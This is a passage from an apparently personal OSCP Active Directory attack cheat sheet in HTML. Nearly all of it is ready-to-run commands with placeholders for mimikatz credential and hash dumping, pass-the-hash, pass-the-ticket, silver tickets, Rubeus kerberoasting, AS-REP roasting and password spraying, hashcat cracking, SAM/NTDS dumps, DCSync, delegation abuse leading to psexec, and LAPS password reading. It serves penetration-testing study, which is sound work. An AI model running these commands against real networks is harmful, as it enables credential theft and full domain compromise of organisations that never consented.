<h4 id="mimikatz">mimikatz</h4>
<h5 id="attack---hashdump">attack - hashdump</h5>
<div class="sourceCode" id="cb27"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true"></a>.\mimikatz.<span class="fu">exe</span></span>
<span id="cb27-2"><a href="#cb27-2" aria-hidden="true"></a>    <span class="co"># elevate</span></span>
<span id="cb27-3"><a href="#cb27-3" aria-hidden="true"></a>    privilege::debug</span>
<span id="cb27-4"><a href="#cb27-4" aria-hidden="true"></a>    <span class="co"># check for logged on passwords (requiers admin/system)</span></span>
<span id="cb27-5"><a href="#cb27-5" aria-hidden="true"></a>    sekurlsa::logonpasswords</span>
<span id="cb27-6"><a href="#cb27-6" aria-hidden="true"></a>    <span class="co"># dump sam</span></span>
<span id="cb27-7"><a href="#cb27-7" aria-hidden="true"></a>    lsadump::lsa /patch</span></code></pre></div>
<h5 id="kerberoast">kerberoast</h5>
<p>See <a href="https://lukasec.ch/posts/oscpadcheatsheet.html#check-for-kerberoastable-accounts">check-for-kerberoastable-accounts</a></p>
<h5 id="overpass-the-hash">overpass the hash</h5>
<div class="sourceCode" id="cb28"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true"></a>.\mimikatz.<span class="fu">exe</span></span>
<span id="cb28-2"><a href="#cb28-2" aria-hidden="true"></a>    sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:NTLM /run:cmd</span>
<span id="cb28-3"><a href="#cb28-3" aria-hidden="true"></a>klist</span>
<span id="cb28-4"><a href="#cb28-4" aria-hidden="true"></a>net use \\DC</span>
<span id="cb28-5"><a href="#cb28-5" aria-hidden="true"></a>klist</span></code></pre></div>
<h5 id="pass-the-ticket">pass the ticket</h5>
<div class="sourceCode" id="cb29"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true"></a>.\mimikatz.<span class="fu">exe</span></span>
<span id="cb29-2"><a href="#cb29-2" aria-hidden="true"></a>    <span class="co"># elevate</span></span>
<span id="cb29-3"><a href="#cb29-3" aria-hidden="true"></a>    privilege::debug</span>
<span id="cb29-4"><a href="#cb29-4" aria-hidden="true"></a>    <span class="co"># export the tickets</span></span>
<span id="cb29-5"><a href="#cb29-5" aria-hidden="true"></a>    <span class="co"># Creates .kirbi files in current folder</span></span>
<span id="cb29-6"><a href="#cb29-6" aria-hidden="true"></a>    sekurlsa::tickets /export</span>
<span id="cb29-7"><a href="#cb29-7" aria-hidden="true"></a></span>
<span id="cb29-8"><a href="#cb29-8" aria-hidden="true"></a>    <span class="co"># Load Ticket on another client</span></span>
<span id="cb29-9"><a href="#cb29-9" aria-hidden="true"></a>    kerberos::ptt ticket.<span class="fu">kirbi</span></span></code></pre></div>
<h5 id="silver-ticket">silver ticket</h5>
<div class="sourceCode" id="cb30"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true"></a>.\mimikatz.<span class="fu">exe</span></span>
<span id="cb30-2"><a href="#cb30-2" aria-hidden="true"></a>    <span class="co"># elevate</span></span>
<span id="cb30-3"><a href="#cb30-3" aria-hidden="true"></a>    privilege::debug</span>
<span id="cb30-4"><a href="#cb30-4" aria-hidden="true"></a></span>
<span id="cb30-5"><a href="#cb30-5" aria-hidden="true"></a>    kerberos:purge</span>
<span id="cb30-6"><a href="#cb30-6" aria-hidden="true"></a>    kerberos::golden /user:USER /domain:DOMAIN /sid:DOMAINSID /target:HOSTNAMETARGET /service:SPNTYPE /rce4:SERVICEHASH /ptt</span></code></pre></div>
<h4 id="rubeus">rubeus</h4>
<h5 id="harvest-tgts">harvest TGTs</h5>
<div class="sourceCode" id="cb31"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true"></a>.\Rubeus.<span class="fu">exe</span> harvest /interval:30</span></code></pre></div>
<h5 id="password-spray">password spray</h5>
<div class="sourceCode" id="cb32"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true"></a>.\Rubeus.<span class="fu">exe</span> brute /password:Password1 /noticket</span></code></pre></div>
<h5 id="kerberoast-1">kerberoast</h5>
<div class="sourceCode" id="cb33"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true"></a>.\Rubeus.<span class="fu">exe</span> kerberoast</span></code></pre></div>
<p>Crack on Kali with</p>
<div class="sourceCode" id="cb34"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true"></a><span class="ex">hashcat</span> --force ticket.hashcat -m 13100  /usr/share/wordlists/rockyou.txt</span></code></pre></div>
<h5 id="asreproast">ASREProast</h5>
<div class="sourceCode" id="cb35"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true"></a>.\Rubeus.<span class="fu">exe</span> asreproast</span></code></pre></div>
<p>Crack on Kali with</p>
<div class="sourceCode" id="cb36"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true"></a><span class="ex">hashcat</span> --force hash -m 18200  /usr/share/wordlists/rockyou.txt</span></code></pre></div>
<h4 id="crackmapexec">crackmapexec</h4>
<div class="sourceCode" id="cb37"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true"></a><span class="co"># get users</span></span>
<span id="cb37-2"><a href="#cb37-2" aria-hidden="true"></a><span class="ex">cme</span> smb IP -u USER -d DOMAIN -p PASSWORD --users</span>
<span id="cb37-3"><a href="#cb37-3" aria-hidden="true"></a><span class="co"># get shares</span></span>
<span id="cb37-4"><a href="#cb37-4" aria-hidden="true"></a><span class="ex">cme</span> smb IP -u USER -d DOMAIN -p PASSWORD --shares</span>
<span id="cb37-5"><a href="#cb37-5" aria-hidden="true"></a><span class="co"># bruteforce</span></span>
<span id="cb37-6"><a href="#cb37-6" aria-hidden="true"></a><span class="ex">cme</span> smb IP -u USERLIST -p PWLIST --continue-on-success</span></code></pre></div>
<h4 id="bloodhound">bloodhound</h4>
<p>Start on Kali</p>
<div class="sourceCode" id="cb38"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true"></a><span class="fu">sudo</span> neo4j console</span>
<span id="cb38-2"><a href="#cb38-2" aria-hidden="true"></a><span class="ex">bloodhound</span> --no-sandbox</span></code></pre></div>
<h5 id="map-ad-remotely">map AD remotely</h5>
<div class="sourceCode" id="cb39"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true"></a><span class="ex">bloodhound-python</span> -u USER -p PASSWORD -d DOMAIN -ns IP -c All</span></code></pre></div>
<h5 id="map-ad-via-client">map AD via client</h5>
<div class="sourceCode" id="cb40"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb40-1"><a href="#cb40-1" aria-hidden="true"></a>. .\Sharphound.<span class="fu">ps1</span></span>
<span id="cb40-2"><a href="#cb40-2" aria-hidden="true"></a>Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.<span class="fu">local</span> -ZipFileName loot.<span class="fu">zip</span></span>
<span id="cb40-3"><a href="#cb40-3" aria-hidden="true"></a></span>
<span id="cb40-4"><a href="#cb40-4" aria-hidden="true"></a>.\sharphound.<span class="fu">exe</span> --CollectionMethod All --Domain CONTROLLER.<span class="fu">local</span> --ZipFileName loot.<span class="fu">zip</span></span></code></pre></div>
<h3 id="other-techniques">other techniques</h3>
<h4 id="pass-the-hash">pass the hash</h4>
<p>Works only on servers with NTML authentication.</p>
<div class="sourceCode" id="cb41"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true"></a><span class="ex">pth-winexe</span> -U USERHASH //IP cmd</span>
<span id="cb41-2"><a href="#cb41-2" aria-hidden="true"></a><span class="ex">evil-winrm</span> -i IP -u USERNAME -H HASH</span></code></pre></div>
<h4 id="dump-local-sam">dump local SAM</h4>
<p>On Windows (administrator needed!)</p>
<div class="sourceCode" id="cb42"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb42-1"><a href="#cb42-1" aria-hidden="true"></a>reg save hklm\sam sam.<span class="fu">out</span></span>
<span id="cb42-2"><a href="#cb42-2" aria-hidden="true"></a>reg save hklm\system system.<span class="fu">out</span></span></code></pre></div>
<p>On Kali</p>
<div class="sourceCode" id="cb43"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb43-1"><a href="#cb43-1" aria-hidden="true"></a><span class="ex">samdump</span> sam.out system.out -o hashes.txt</span>
<span id="cb43-2"><a href="#cb43-2" aria-hidden="true"></a></span>
<span id="cb43-3"><a href="#cb43-3" aria-hidden="true"></a><span class="ex">hashcat</span> --force hashes.txt -m 1000 /usr/share/wordlists/rockyou.txt</span>
<span id="cb43-4"><a href="#cb43-4" aria-hidden="true"></a><span class="ex">john</span>  hashes.txt -format=nt -wordlist /usr/share/wordlists/rockyou.txt</span></code></pre></div>
<h4 id="dump-the-ntds">dump the NTDS</h4>
<div class="sourceCode" id="cb44"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb44-1"><a href="#cb44-1" aria-hidden="true"></a><span class="ex">secretsdump.py</span> -ntds ntds.dit -security registry/SECURITY -system registry/SYSTEM local -pwd-last-set -user-status -history</span></code></pre></div>
<h4 id="dc-sync-attack">DC sync attack</h4>
<p>If owned user has writes to sync to DC: <code>GetChangesAll</code></p>
<div class="sourceCode" id="cb45"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb45-1"><a href="#cb45-1" aria-hidden="true"></a><span class="co"># on Kali</span></span>
<span id="cb45-2"><a href="#cb45-2" aria-hidden="true"></a><span class="ex">secretsdump.py</span> DOMAIN/USER@DCIP</span>
<span id="cb45-3"><a href="#cb45-3" aria-hidden="true"></a><span class="ex">secretsdump.py</span> DOMAIN/USER@DCIP -just-dc-user USERTOGETHASH</span></code></pre></div>
<h4 id="spn-impersonate">SPN impersonate</h4>
<p>If owned user has constrained delegation privileges: <code>TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION</code></p>
<div class="sourceCode" id="cb46"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb46-1"><a href="#cb46-1" aria-hidden="true"></a><span class="co"># we need to have the same time as the DC</span></span>
<span id="cb46-2"><a href="#cb46-2" aria-hidden="true"></a><span class="co"># stop getting time from vhost</span></span>
<span id="cb46-3"><a href="#cb46-3" aria-hidden="true"></a><span class="fu">sudo</span> service virtualbox-guest-utils stop</span>
<span id="cb46-4"><a href="#cb46-4" aria-hidden="true"></a><span class="co"># update time from DC</span></span>
<span id="cb46-5"><a href="#cb46-5" aria-hidden="true"></a><span class="fu">sudo</span> service sudo ntpdate DCIP</span>
<span id="cb46-6"><a href="#cb46-6" aria-hidden="true"></a></span>
<span id="cb46-7"><a href="#cb46-7" aria-hidden="true"></a><span class="ex">getST.py</span> -dc-ip DCIP -spn SPN -hashes HASHFROMDOMUSER -impersonate administrator DOM/USER</span>
<span id="cb46-8"><a href="#cb46-8" aria-hidden="true"></a><span class="bu">export</span> <span class="va">KRB5CCNAME=</span>Administrator.ccache</span>
<span id="cb46-9"><a href="#cb46-9" aria-hidden="true"></a></span>
<span id="cb46-10"><a href="#cb46-10" aria-hidden="true"></a><span class="ex">impacket-psexec</span> -k DOMAIN/Administrator@DC -no-pass</span>
<span id="cb46-11"><a href="#cb46-11" aria-hidden="true"></a></span>
<span id="cb46-12"><a href="#cb46-12" aria-hidden="true"></a><span class="co"># revert NTP</span></span>
<span id="cb46-13"><a href="#cb46-13" aria-hidden="true"></a><span class="fu">sudo</span> service virtualbox-guest-utils start</span></code></pre></div>
<h4 id="show-laps-passwords">show LAPS passwords</h4>
<p>If owned user is either LAPS admin or just LAPS reader:</p>
<div class="sourceCode" id="cb47"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb47-1"><a href="#cb47-1" aria-hidden="true"></a><span class="ex">ldapsearch</span> -v -x -D USER@DOMAIN -w PASSWORD -b <span class="st">"DC=DOMAIN,DC=com"</span> -h DCIP <span class="st">"(ms-MCS-AdmPwd=*)"</span> ms-MCS-AdmPwd</span></code></pre></div>
<h4 id="remote-registry">remote registry</h4>
<div class="sourceCode" id="cb48"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb48-1"><a href="#cb48-1" aria-hidden="true"></a><span class="ex">reg.py</span> -hashes LANDMAN:HASH DOMAIN/USER@DC query -keyName HKU<span class="dt">\\</span></span></code></pre></div>
</article>

<br>
<a href="#OSCP-AD-cheat-sheet">back to the top</a><br>

<footer>

  <hr>

  This site does not use cookies, js or third parties<br>
  This site is for educational use only

  <br>
  <br>

</footer>

</body></html>
